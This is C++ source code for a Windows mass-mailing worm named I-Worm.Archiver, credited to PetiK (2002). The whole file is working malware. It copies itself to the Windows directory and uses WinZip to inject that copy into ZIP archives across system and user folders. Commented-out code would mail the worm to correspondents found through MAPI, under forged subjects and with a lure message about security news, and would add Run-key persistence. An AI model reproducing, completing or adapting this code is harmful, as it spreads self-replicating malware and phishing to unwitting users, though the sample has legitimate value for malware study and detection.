/*
Name : I-Worm.Archiver
Author : PetiK
Date : Mai 10th 2002 - 
Language : C++

Comments : Infect ZIP files which run with WINZIP.

		We can also to do the same think with PowerArchiver:
			powerarc -a -c4 archive.zip virus.exe

*/

#include <windows.h>
#include <stdio.h>
#include <mapi.h>

#pragma argused
#pragma inline


char	filen[100],copyn[100],copyreg[100],windir[100],sysdir[100],inzip[256],fsubj[50];
char	*fnam[]={"news","support","info","newsletter","webmaster"};
char	*fmel[]={"@yahoo.com","@hotmail.com","@symantec.com","@microsoft.com","@avp.ch","@viruslist.com"};
LPSTR	run="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	SHFolder=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
char	attname[]="news_xxxxxxxx.exe";
LPTSTR	cmdLine,ptr;
BOOL	installed;
BYTE	desktop[50],favoris[50],personal[50],winzip[50];
DWORD	sizdesktop=sizeof(desktop),sizfavoris=sizeof(favoris),
	sizpersonal=sizeof(personal),sizwinzip=sizeof(winzip);
DWORD	type=REG_SZ;
long	i;

LHANDLE session;
MapiMessage *mes;
MapiRecipDesc from;
char messId[512],mname[50],maddr[30];
HINSTANCE hMAPI;

HKEY		hReg;
WIN32_FIND_DATA	ffile;

void infzip(char *);

ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{

GetModuleFileName(hInst,filen,100);
GetSystemDirectory((char *)sysdir,100);
GetWindowsDirectory((char *)copyn,100);
strcpy(windir,copyn);
strcat(copyn,"\\Archiver.exe");

installed=FALSE;
cmdLine=GetCommandLine();
if(cmdLine) {
	for(ptr=cmdLine;ptr[0]!='-' && ptr[1]!=0;ptr++);
	if(ptr[0]=='-' && ptr[1]!=0) {
		switch(ptr[1]) {
			default:
			break;
			case 'i':
				installed=TRUE;
				break;
			case 'p':
				ShellAbout(0,"I-Worm.Archiver","Copyright (c)2002 - PetiKVX",0);
				MessageBox(NULL,"This new Worm was coded by PetiK.\nFrance - (c)2002",
					"I-Worm.Archiver",MB_OK|MB_ICONINFORMATION);
				ExitProcess(0);
				break;
			}
		}
	}

if(!installed) {
CopyFile(filen,copyn,FALSE);
strcpy(copyreg,copyn);
strcat(copyreg," -i");
/* RegOpenKeyEx(HKEY_LOCAL_MACHINE,run,0,KEY_WRITE,&hReg);
RegSetValueEx(hReg,"Archiver",0,REG_SZ,(BYTE *)copyreg,100);
RegCloseKey(hReg); */
ExitProcess(0);
}

RegOpenKeyEx(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,"Desktop",0,&type,desktop,&sizdesktop);
RegQueryValueEx(hReg,"Favorites",0,&type,favoris,&sizfavoris);
RegQueryValueEx(hReg,"Personal",0,&type,personal,&sizpersonal);
RegCloseKey(hReg);
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\windows\\CurrentVersion\\App Paths\\winzip32.exe",0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,NULL,0,&type,winzip,&sizwinzip);
RegCloseKey(hReg);

if(strlen(winzip)!=0) {
infzip(windir);
infzip(sysdir);
infzip(desktop);
infzip(personal);
infzip(favoris);
infzip("C:\\");
}

/*
_asm
{
call	@wininet
db	"WININET.DLL",0
@wininet:
call	LoadLibrary
test	eax,eax
jz	end_asm
mov	ebp,eax
call	@inetconnect
db	"InternetGetConnectedState",0
@inetconnect:
push	ebp
call	GetProcAddress
test	eax,eax
jz	end_wininet
mov	edi,eax
verf:
push	0
push	Tmp
call	edi
dec	eax
jnz	verf

end_wininet:
push	ebp
call	FreeLibrary
end_asm:
jmp	end_all_asm

Tmp	dd 0

end_all_asm:
}


hMAPI=LoadLibrary("MAPI32.DLL");
(FARPROC &)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
(FARPROC &)mLogon=GetProcAddress(hMAPI, "MAPILogon");
(FARPROC &)mLogoff=GetProcAddress(hMAPI, "MAPILogoff");
(FARPROC &)mFindNext=GetProcAddress(hMAPI, "MAPIFindNext");
(FARPROC &)mReadMail=GetProcAddress(hMAPI, "MAPIReadMail");
(FARPROC &)mFreeBuffer=GetProcAddress(hMAPI, "MAPIFreeBuffer");
mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&session);
if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
  do {
     if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mes)==SUCCESS_SUCCESS) {
	strcpy(mname,mes->lpOriginator->lpszName);
	strcpy(maddr,mes->lpOriginator->lpszAddress);

	for(i=0;i<8;i++)
	attname[i+5]='1'+(char)(9*rand()/RAND_MAX);
	fsubj[0]=0;
	wsprintf(fsubj,"News from %s%s",fnam[GetTickCount()%4],fmel[GetTickCount()%5]);


	mes->ulReserved=0;
	mes->lpszSubject=fsubj;
	mes->lpszNoteText="This is some news send by our firm about security.\n"
				"Please read by clicking on attached file.\n"
				"\tBest Regards";
	mes->lpszMessageType=NULL;
	mes->lpszDateReceived=NULL;
	mes->lpszConversationID=NULL;
	mes->flFlags=MAPI_SENT;
	mes->lpOriginator->ulReserved=0;
	mes->lpOriginator->ulRecipClass=MAPI_ORIG;
	mes->lpOriginator->lpszName=mes->lpRecips->lpszName;
	mes->lpOriginator->lpszAddress=mes->lpRecips->lpszAddress;
	mes->nRecipCount=1;
	mes->lpRecips->ulReserved=0;
	mes->lpRecips->ulRecipClass=MAPI_TO;
	mes->lpRecips->lpszName=mname;
	mes->lpRecips->lpszAddress=maddr;
	mes->nFileCount=1;
	mes->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
	memset(mes->lpFiles, 0, sizeof(MapiFileDesc));
	mes->lpFiles->ulReserved=0;
	mes->lpFiles->flFlags=NULL;
	mes->lpFiles->nPosition=-1;
	mes->lpFiles->lpszPathName=filen;
	mes->lpFiles->lpszFileName=attname;
	mes->lpFiles->lpFileType=NULL;
	mSendMail(session, NULL, mes, NULL, NULL);
	}
  }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
free(mes->lpFiles);
mFreeBuffer(mes);
mLogoff(session,0,0,0);
FreeLibrary(hMAPI);
}

*/

ExitProcess(0);
}

void infzip(char *folder)
{
register bool abc=TRUE;
register HANDLE fh;
if(strlen(folder)!=0) {
SetCurrentDirectory(folder);
fh=FindFirstFile("*.zip",&ffile);
if(fh!=INVALID_HANDLE_VALUE) {
	while(abc) {
	inzip[0]=0;
	wsprintf(inzip,"%s -a -r %s %s",winzip,ffile.cFileName,copyn);
	WinExec(inzip,1);
	abc=FindNextFile(fh,&ffile);
	}
}
}

}
